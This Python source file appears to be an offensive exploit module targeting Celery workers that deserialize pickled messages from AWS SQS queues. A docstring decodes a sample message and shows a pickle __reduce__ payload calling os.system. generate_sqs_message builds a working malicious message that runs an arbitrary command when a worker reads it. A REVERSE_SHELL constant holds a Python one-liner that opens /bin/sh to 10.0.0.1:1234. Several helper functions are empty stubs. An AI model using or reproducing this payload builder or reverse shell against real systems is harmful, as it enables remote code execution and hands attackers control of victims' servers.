'''
This comment holds the basics behind the exploit. Don't remove!

In the SQS queue we'll find a message holding this information:

eyJib2R5IjogImdBSjljUUVvVlFkbGVIQnBjbVZ6Y1FKT1ZRTjFkR054QTRoVkJHRnlaM054QkZnZE
FBQUFhSFIwY0RvdkwyaDBkSEJpYVc0dWIzSm5MM1Z6WlhJdFlXZGxiblJ4QllWeEJsVUZZMmh2Y21S
eEIwNVZDV05oYkd4aVlXTnJjM0VJVGxVSVpYSnlZbUZqYTNOeENVNVZCM1JoYzJ0elpYUnhDazVWQW
1sa2NRdFZKREF4TXpKa05XRm1MV1JtWVdZdE5ESXlOUzA1TURKbExXTmhNR1ZpT0RneVptVmlaSEVN
VlFkeVpYUnlhV1Z6Y1ExTEFGVUVkR0Z6YTNFT1ZSTndjbTk0ZVM1MFlYTnJjeTVzYjJkZmRYSnNjUT
lWQTJWMFlYRVFUbFVHYTNkaGNtZHpjUkY5Y1JKMUxnPT0iLCAiaGVhZGVycyI6IHt9LCAiY29udGVu
dC10eXBlIjogImFwcGxpY2F0aW9uL3gtcHl0aG9uLXNlcmlhbGl6ZSIsICJwcm9wZXJ0aWVzIjogey
Jib2R5X2VuY29kaW5nIjogImJhc2U2NCIsICJkZWxpdmVyeV9pbmZvIjogeyJwcmlvcml0eSI6IDAs
ICJyb3V0aW5nX2tleSI6ICJjZWxlcnkiLCAiZXhjaGFuZ2UiOiAiY2VsZXJ5In0sICJkZWxpdmVyeV
9tb2RlIjogMiwgImRlbGl2ZXJ5X3RhZyI6ICI2MTlhMjA4Ny05Mjg1LTQzNGYtYTlkNC02ZDM2ZGNi
NzJkNjcifSwgImNvbnRlbnQtZW5jb2RpbmciOiAiYmluYXJ5In0

After one base64 decode we get the following information:

{"body": "gAJ9cQEoVQdleHBpcmVzcQJOVQN1dGNxA4hVBGFyZ3NxBFgdAAAAaHR0cDovL2h0dHBi
          aW4ub3JnL3VzZXItYWdlbnRxBYVxBlUFY2hvcmRxB05VCWNhbGxiYWNrc3EITlUIZXJy
          YmFja3NxCU5VB3Rhc2tzZXRxCk5VAmlkcQtVJDAxMzJkNWFmLWRmYWYtNDIyNS05MDJl
          LWNhMGViODgyZmViZHEMVQdyZXRyaWVzcQ1LAFUEdGFza3EOVRNwcm94eS50YXNrcy5s
          b2dfdXJscQ9VA2V0YXEQTlUGa3dhcmdzcRF9cRJ1Lg==",
 "headers": {}, "content-type": "application/x-python-serialize", 
 "properties": {"body_encoding": "base64",
                "delivery_info": {"priority": 0,
                                  "routing_key": "celery",
                                  "exchange": "celery"},
                "delivery_mode": 2,
                "delivery_tag": "619a2087-9285-434f-a9d4-6d36dcb72d67"},
 "content-encoding": "binary"}

Base64 decoding the body we get:

\x80\x02}q\x01(U\x07expiresq\x02NU\x03utcq\x03\x88U\x04argsq\x04X\x1d\x00\x00
\x00http://httpbin.org/user-agentq\x05\x85q\x06U\x05chordq\x07NU\tcallbacksq
\x08NU\x08errbacksq\tNU\x07tasksetq\nNU\x02idq\x0bU$0132d5af-dfaf-4225-902e-
ca0eb882febdq\x0cU\x07retriesq\rK\x00U\x04taskq\x0eU\x13proxy.tasks.log_urlq\x0f
U\x03etaq\x10NU\x06kwargsq\x11}q\x12u.

Which when unpickled is:

>>> pickle.loads('\x80\x02}q\x01(U\x07expiresq\x02NU\x03utcq\x03\x88U\x04argsq
                  \x04X\x1d\x00\x00\x00http://httpbin.org/user-agentq\x05\x85q
                  \x06U\x05chordq\x07NU\tcallbacksq\x08NU\x08errbacksq\tNU\x07
                  tasksetq\nNU\x02idq\x0bU$0132d5af-dfaf-4225-902e-ca0eb882feb
                  dq\x0cU\x07retriesq\rK\x00U\x04taskq\x0eU\x13proxy.tasks.log
                  _urlq\x0fU\x03etaq\x10NU\x06kwargsq\x11}q\x12u.')

{'utc': True, 'chord': None, 'args': (u'http://httpbin.org/user-agent',),
 'retries': 0, 'expires': None, 'task': 'proxy.tasks.log_url',
 'callbacks': None, 'errbacks': None, 'taskset': None, 'kwargs': {},
 'eta': None, 'id': '0132d5af-dfaf-4225-902e-ca0eb882febd'}

So, if we want to create a body that is valid but when decoded will run an
arbitrary command, we can use the following:

import pickle
import os
 
class RunCmd(object):
  def __reduce__(self):
    return (os.system, ('/bin/ls',))

data = {'utc': True, 'chord': None, 'args': (u'http://httpbin.org/user-agent',),
        'retries': 0, 'expires': None, 'task': 'proxy.tasks.log_url',
        'callbacks': None, 'errbacks': None, 'taskset': None, 'kwargs': {},
        'eta': None, 'id': '0132d5af-dfaf-4225-902e-ca0eb882febd',
        'payload':RunCmd()}

raw = pickle.dumps(data)
pickle.loads(raw) # /bin/ls is run
'''

import base64
import pickle
import os
import json
import logging


def is_vulnerable_sqs_queue(queue_name, region):
    '''
    Analyze the SQS queue and return True if:
        * Celery is used
        * The serialization is the default (python pickle)
    '''
    pass

def is_celery_message(message_text):
    '''
    :return: True if this is a celery message
    '''
    try:
        b64_decoded = base64.decodestring(message_text)
    except:
        return False
    
    try:
        json_decoded = json.loads(b64_decoded)
        assert 'body' in json_decoded
        assert 'content-encoding' in json_decoded
    except:
        return False
    
    return True

def can_write_to_sqs(queue_name, region):
    '''
    :return: True if I can write to the SQS queue with :queue_name:
    '''
    pass

def send_payload_to_sqs(queue_name, region, command):
    '''
    :return: True if the payload was successfully sent
    '''
    sqs_message = generate_sqs_message(command)

def generate_sqs_message(command):
    '''
    :return: A string with the message to send to the SQS queue
    '''
    MESSAGE = {"body": None,
               "headers": {}, "content-type": "application/x-python-serialize", 
               "properties": {"body_encoding": "base64",
                              "delivery_info": {"priority": 0,
                                                "routing_key": "celery",
                                                "exchange": "celery"},
                              "delivery_mode": 2,
                              "delivery_tag": "619a2087-9285-434f-a9d4-6d36dcb72d67"},
               "content-encoding": "binary"}
    
    BODY = {'utc': True, 'chord': None, 'args': (u'http://httpbin.org/user-agent',),
            'retries': 0, 'expires': None, 'task': 'proxy.tasks.log_url',
            'callbacks': None, 'errbacks': None, 'taskset': None, 'kwargs': {},
            'eta': None, 'id': '0132d5af-dfaf-4225-902e-ca0eb882febd'}
    
    class RunCmd(object):
        def __init__(self, command):
            self.command = command
            
        def __reduce__(self):
            return (os.system, (self.command,))
        
    BODY['payload'] = RunCmd(command)
    
    raw_body = pickle.dumps(BODY)
    body_64 = base64.encodestring(raw_body)
    
    MESSAGE['body'] = body_64
    json_message = json.dumps(MESSAGE)
    sqs_message = base64.encodestring(json_message)
    
    return sqs_message

def get_sqs_queues():
    '''
    :return: A list with tuples with SQS queue name and region.
    '''
    return []

def exploit_celery_pickle(cmd_args):
    '''
    Main entry point for the exploit command.
    '''
    logging.debug('Starting Celery exploit')
    command = cmd_args['command']
    
    for queue_name, region in get_sqs_queues():
        if not is_vulnerable_sqs_queue(queue_name, region):
            logging.debug('SQS queue %s is not vulnerable' % queue_name)
            continue
        
        logging.debug('SQS queue %s is vulnerable' % queue_name)
        
        if not can_write_to_sqs(queue_name, region):
            logging.debug('We can NOT write to the SQS queue.')
            continue
        
        logging.debug('We can write to the SQS queue. Sending payload.')
        send_payload_to_sqs(queue_name, region, command)

REVERSE_SHELL = """\
python -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'"""

def reverse_shell():
    cmd = REVERSE_SHELL.replace('\n', '')
    